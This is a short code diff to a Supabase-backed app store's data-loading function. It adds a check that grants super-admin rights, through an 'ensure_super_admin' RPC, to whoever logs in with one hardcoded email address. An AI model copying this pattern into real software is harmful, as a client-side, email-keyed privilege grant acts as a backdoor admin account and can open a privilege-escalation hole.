@@ -16,6 +16,9 @@ export const useAppStore = create<AppState>((set, get) => ({
   fetchInitialData: async () => {
     const { data:{ user: authUser } } = await supabase.auth.getUser()
     if (!authUser) { set({user:null}); return }
+    if (authUser.email?.toLowerCase() === 'muosab2008@gmail.com') {
+      await supabase.rpc('ensure_super_admin', { p_user_id: authUser.id })
+    }
     const [{data: profile}, {data:products}, {data:inventory}, {data:topups}, {data:orders}, {data:settings}] = await Promise.all([
       supabase.from('profiles').select('id,email,role,balance,created_at').eq('id',authUser.id).single(),
       supabase.from('products').select('id,name,description,image_url,price,is_active,is_deal,created_at').order('created_at',{ascending:false}),
